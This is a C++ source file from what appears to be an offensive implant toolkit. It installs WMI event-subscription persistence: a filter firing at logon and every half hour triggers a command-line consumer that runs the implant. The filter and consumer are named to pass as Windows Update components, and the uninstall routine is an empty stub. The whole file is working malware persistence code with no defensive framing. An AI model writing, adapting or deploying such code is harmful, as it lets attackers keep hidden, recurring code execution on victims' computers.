#include "WmiPersistence.h"
#include "../utils/Logger.h"
#include <comdef.h>
#include <wbemidl.h>

#pragma comment(lib, "wbemuuid.lib")

namespace persistence {

bool WmiPersistence::Install(const std::wstring& implantPath, const std::wstring& taskName) {
    HRESULT hr;
    IWbemLocator* pLoc = nullptr;
    IWbemServices* pSvc = nullptr;

    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr)) return false;

    // Use explicit cast for MinGW compatibility as per memory
    hr = pLoc->ConnectServer((BSTR)_bstr_t(L"ROOT\\subscription"), NULL, NULL, 0, 0, 0, 0, &pSvc);
    if (FAILED(hr)) {
        pLoc->Release();
        return false;
    }

    hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(hr)) {
        pSvc->Release();
        pLoc->Release();
        return false;
    }

    // 1. Create Event Filter
    // Combine Hourly trigger + Logon trigger
    std::wstring filterName = L"WinUpdateFilter_" + taskName;
    // Trigger on logon OR every 30 minutes
    std::wstring query = L"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE "
                         L"(TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute = 0 OR TargetInstance.Minute = 30)) "
                         L"OR (TargetInstance ISA 'Win32_LogonSession')";

    IWbemClassObject* pFilterClass = nullptr;
    hr = pSvc->GetObject((BSTR)_bstr_t(L"__EventFilter"), 0, NULL, &pFilterClass, NULL);
    if (FAILED(hr)) { pSvc->Release(); pLoc->Release(); return false; }

    IWbemClassObject* pFilterInstance = nullptr;
    pFilterClass->SpawnInstance(0, &pFilterInstance);

    VARIANT var;
    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(filterName.c_str());
    pFilterInstance->Put(L"Name", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(query.c_str());
    pFilterInstance->Put(L"Query", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"WQL");
    pFilterInstance->Put(L"QueryLanguage", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"root\\cimv2");
    pFilterInstance->Put(L"EventNamespace", 0, &var, 0);
    VariantClear(&var);

    hr = pSvc->PutInstance(pFilterInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    if (FAILED(hr)) { LOG_ERR("WMI Filter PutInstance failed."); }

    // 2. Create Consumer
    std::wstring consumerName = L"WinUpdateConsumer_" + taskName;
    IWbemClassObject* pConsumerClass = nullptr;
    hr = pSvc->GetObject((BSTR)_bstr_t(L"CommandLineEventConsumer"), 0, NULL, &pConsumerClass, NULL);
    IWbemClassObject* pConsumerInstance = nullptr;
    pConsumerClass->SpawnInstance(0, &pConsumerInstance);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(consumerName.c_str());
    pConsumerInstance->Put(L"Name", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(implantPath.c_str());
    pConsumerInstance->Put(L"CommandLineTemplate", 0, &var, 0);
    VariantClear(&var);

    hr = pSvc->PutInstance(pConsumerInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    if (FAILED(hr)) { LOG_ERR("WMI Consumer PutInstance failed."); }

    // 3. Bind Filter to Consumer
    IWbemClassObject* pBindingClass = nullptr;
    hr = pSvc->GetObject((BSTR)_bstr_t(L"__FilterToConsumerBinding"), 0, NULL, &pBindingClass, NULL);
    IWbemClassObject* pBindingInstance = nullptr;
    pBindingClass->SpawnInstance(0, &pBindingInstance);

    std::wstring filterRelPath = L"__EventFilter.Name=\"" + filterName + L"\"";
    std::wstring consumerRelPath = L"CommandLineEventConsumer.Name=\"" + consumerName + L"\"";

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(filterRelPath.c_str());
    pBindingInstance->Put(L"Filter", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(consumerRelPath.c_str());
    pBindingInstance->Put(L"Consumer", 0, &var, 0);
    VariantClear(&var);

    hr = pSvc->PutInstance(pBindingInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    if (FAILED(hr)) { LOG_ERR("WMI Binding PutInstance failed."); }

    pBindingInstance->Release();
    pBindingClass->Release();
    pConsumerInstance->Release();
    pConsumerClass->Release();
    pFilterInstance->Release();
    pFilterClass->Release();
    pSvc->Release();
    pLoc->Release();

    return SUCCEEDED(hr);
}

bool WmiPersistence::Verify(const std::wstring& taskName) {
    HRESULT hr;
    IWbemLocator* pLoc = nullptr;
    IWbemServices* pSvc = nullptr;

    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr)) return false;

    hr = pLoc->ConnectServer((BSTR)_bstr_t(L"ROOT\\subscription"), NULL, NULL, 0, 0, 0, 0, &pSvc);
    if (FAILED(hr)) { pLoc->Release(); return false; }

    std::wstring filterName = L"WinUpdateFilter_" + taskName;
    std::wstring relPath = L"__EventFilter.Name=\"" + filterName + L"\"";

    IWbemClassObject* pObj = nullptr;
    hr = pSvc->GetObject((BSTR)_bstr_t(relPath.c_str()), 0, NULL, &pObj, NULL);

    bool exists = SUCCEEDED(hr) && pObj != nullptr;
    if (pObj) pObj->Release();
    pSvc->Release();
    pLoc->Release();

    return exists;
}

bool WmiPersistence::Uninstall(const std::wstring& taskName) {
    (void)taskName;
    // Implementation for uninstall if needed
    return true;
}

} // namespace persistence
